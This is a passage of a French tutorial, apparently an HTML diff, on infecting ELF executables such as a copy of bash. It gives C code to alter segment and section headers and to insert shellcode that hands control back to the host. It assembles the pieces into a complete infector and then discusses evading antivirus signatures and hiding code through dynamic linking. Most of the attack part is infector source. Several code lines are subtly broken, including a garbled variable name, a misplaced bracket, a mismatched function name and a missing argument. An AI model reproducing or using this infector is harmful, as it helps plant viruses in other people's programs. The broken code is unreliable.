+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sec.<span style="color: #202020;">sh_size</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sec<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div></li>
+	<li>Mettre à jour le code à insérer afin qu'il rende la main au programme hôte après son exécution. Puis, l'insérer à la fin du segment choisi en préservant l'alignement.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Insertion du Shellcode */</span><br />
+<span style="color: #993333;">int</span> insert_shellcode<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> Elf32_Off shc_off<span style="color: #339933;">,</span> Elf32_Off page_size<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>code<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> code_size<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Mettre à jour le shellcode */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>Elf32_Addr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>code <span style="color: #339933;">+</span> SHC_RETADD<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> hdr.<span style="color: #202020;">e_entry</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Insérer */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span><span style="color: #339933;">*</span> save <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/malloc.html"><span style="color: #000066;">malloc</span></a><span style="color: black;">&#40;</span>page_size <span style="color: #339933;">*</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span><span style="color: #339933;">*</span> towrite <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/malloc.html"><span style="color: #000066;">malloc</span></a><span style="color: black;">&#40;</span>page_size <span style="color: #339933;">*</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>towrite<span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> code_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> read <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>save<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> page_size<span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/feof.html"><span style="color: #000066;">feof</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #339933;">-</span>page_size<span style="color: #339933;">,</span> SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>towrite<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> page_size<span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span><span style="color: #339933;">*</span> tmp <span style="color: #339933;">=</span> save<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; save <span style="color: #339933;">=</span> towrite<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; towrite <span style="color: #339933;">=</span> tmp<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; read <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span>save<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> page_size<span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #339933;">-</span>read<span style="color: #339933;">,</span> SEEK_END<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>towrite<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> page_size<span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span>save<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> page_size<span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/free.html"><span style="color: #000066;">free</span></a><span style="color: black;">&#40;</span>save<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/free.html"><span style="color: #000066;">free</span></a><span style="color: black;">&#40;</span>towrite<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div></li>
+	<li>En assemblant ces différents composants nous obtenons le programme suivant.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#include &lt;stdio.h&gt;</span><br />
+<span style="color: #339933;">#include &lt;string.h&gt;</span><br />
+<span style="color: #339933;">#include &lt;stdlib.h&gt;</span><br />
+<span style="color: #339933;">#include &lt;elf.h&gt;</span><br />
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">**</span> argv<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; FILE<span style="color: #339933;">*</span> fp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;rb+&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr hdr<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr ins_seg <span style="color: #339933;">=</span> find_seg<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off shc_off <span style="color: #339933;">=</span> ins.<span style="color: #202020;">seg</span>.<span style="color: #202020;">p_offset</span> <span style="color: #339933;">+</span> ins_seg.<span style="color: #202020;">p_filesz</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; update_header<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_entry</span><span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; update_seg<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; update_sec<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; insert_shellcode<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> SHC_SIZE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div></li>
+</ol>
+<p>Après avoir infecté la copie de <em>bash</em> nous relançons les programmes de la première partie. Nous avons mis en évidence les principaux changements. En particuler on remarque que le code a été inséré dans la section 16 qui n'est pourtant pas exécutable. Cela illustre le fait que le champ <em>sh_flags</em> est seulement indicatif.</p>
+<pre class="source">
+$ ./bash
+Bonjour
+$ ./header bash
+Signature Entrée Tab seg Tab sec
+<strong>ELF 80a8254 34 a8b48</strong>
+$ ./segment bash
+# LOAD Position Taille Adresse Espace xwr
+0 Non 34 100 8048034 100 x r
+1 Non 134 13 8048134 13 r
+<strong>2 Oui 0 a33c0 8048000 a33c0 x r</strong>
+...
+$ ./section bash
+# Position Taille wax
+0 0 0
+1 134 13 a
+...
+15 a22f8 2c a
+<strong>16 a2324 109c a</strong>
+...
+</pre>
+<h3><a name="c25"></a>Remarques</h3>
+<p>Nous avons présente un cas d'école en matière d'insertion de code qui possède plusieurs faiblesses.</p>
+<ul>
+	<li>Le point d'entrée se situe sur une section qui n'est pas exécutable. Même si cela ne gêne pas le cliargement en mémoire et l'exécution, les logiciels antiviraux peuvent utiliser une telle anomalie comme heuristique.</li>
+	<li>Le code inséré possède deux particularités pouvant servir de graines à la construction d'une signature. La première est l'utilisation d'une interruption <em>int 0x80</em>, ce qui est peu courant. La plupart des programmes <em>normaux</em> auraient plutôt fait appel à une fonction de <em>libc</em> comme <em>fputs</em>. Deuxièmement, la séquence <em>call +off; jmp -off; pop ecx</em> est typique d'un code malveillant ayant besoin de connaître son adresse mémoire.</li>
+</ul>
+<h2><a name="c3"></a>Liaison dynamique</h2>
+<p>Nous proposons une introduction au mécanisme de liaison dynamique, encore une fois pour un descriptif plus approfondi le lecteur se référera à [7]. Nous exposons ensuite comment exploiter les appels dynamiques d'un hôte, afin de dissimuler le code inséré et de réduire sa taille.</p>
+<h3><a name="c31"></a>Description générale</h3>
+<p>Plusieurs secttons interviennent dans le processus de liaison, parmi celles-ci on retrouve les suivantes.</p>
+<ul>
+	<li><em>.got</em>: table de correspondance entre les symboles et leurs valeurs.</li>
+	<li><em>.dynstr</em>: liste des noms de symboles.</li>
+	<li><em>.dynsym</em>: liste des symboles.</li>
+	<li><em>.plt</em>: table de redirection des appels de procédure.</li>
+	<li><em>.rel.plt</em>: table de relation des redirections.</li>
+</ul>
+<p>Pour réaliser les liaisons, chaque fichier comporte des symboles, pour chaque symbole deux cas de figure se présentent.</p>
+<ul>
+	<li>Le symbole est directement associé à une entrée de la table de correspondance <em>.got</em>. C'est le cas pour les symboles de variable globale.</li>
+	<li>Le symbole est associé à une entrée de la table de redirection <em>.plt</em> qui fait elle-même référence à une entrée de la table de correspondance par l'intermédiaire d'un emballage. C'est le cas pour la plupart des symboles de procédure.</li>
+</ul>
+<p>La table de correspondance est générée par l'éditeur de liens entre le chargement du programme en mémoire et le début de son exécution.</p>
+<h3><a name="c32"></a>En pratique</h3>
+<p>Nous décrivons comment accéder aux differentes informations de liaison dynamique.</p>
+<h4><a name="c321"></a>Les noms de sections</h4>
+<p>Nous avons fait référence aux sections par leur nom. Ces noms sont accessibles par l'intermédiaire de la sectton <em>.shstrtab</em> contient une liste de noms. Le champ <em>sh_name</em> des en-têtes de section contient un index donnant la position du nom dans la section <em>.shstrtab</em>. Ainsi, nous pouvons accéder aux sections par leur nom grâce aux procédures suivantes.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* rechercher l'index d'une chaîne */</span><br />
+Elf32_Word getstrdx<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Shdr sec<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>str<span style="color: #339933;">,</span> <span style="color: #993333;">size_t</span> length<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> sec.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">size_t</span> cpt <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> c<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> sec.<span style="color: #202020;">sh_size</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; c <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/getc.html"><span style="color: #000066;">getc</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>str<span style="color: black;">&#91;</span>cpt <span style="color: #339933;">==</span> c<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">++</span>cpt<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>cpt <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #339933;">-</span>cpt<span style="color: #339933;">,</span> SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i <span style="color: #339933;">-=</span> cpt<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cpt <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>cpt <span style="color: #339933;">==</span> length<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> i <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span> <span style="color: #339933;">-</span> length<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;La châne %s est introuvable<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> str<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+<br />
+<span style="color: #808080; font-style: italic;">/* En-tête de section depuis le nom */</span><br />
+Elf32_Shdr get_shdr<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">*</span> name<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_shoff</span> <span style="color: #339933;">+</span> hdr.<span style="color: #202020;">e_shstrndx</span> <span style="color: #339933;">*</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr sec<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sec<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word strdx <span style="color: #339933;">=</span> get_strdx<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> sec<span style="color: #339933;">,</span> name<span style="color: #339933;">,</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span style="color: #000066;">strlen</span></a><span style="color: black;">&#40;</span>name<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_shoff</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Half i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> hdr.<span style="color: #202020;">e_shnum</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sec<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>sec.<span style="color: #202020;">sh_name</span> <span style="color: #339933;">==</span> strdx<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> sec<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Section %s introuvable<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> name<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div>
+<h4><a name="c322"></a>Les symboles</h4>
+<p>Les symboles sont associés à leur nom par la même méthode: la section <em>.dynstr</em> contenant la liste des noms de symboles et la section <em>.dynsym</em> contenant la liste des symboles. Les éléments de la table <em>.dynsym</em> sont décrits par le type <em>Elf32_Sym</em> dont le champ <em>st_value</em> contient l'adresse mémoire à laquelle l'éditeur de lien inscrira l'adresse mémoire associée au symbole. Une autre valeur importante est l'index du symbole dans la table.</p>
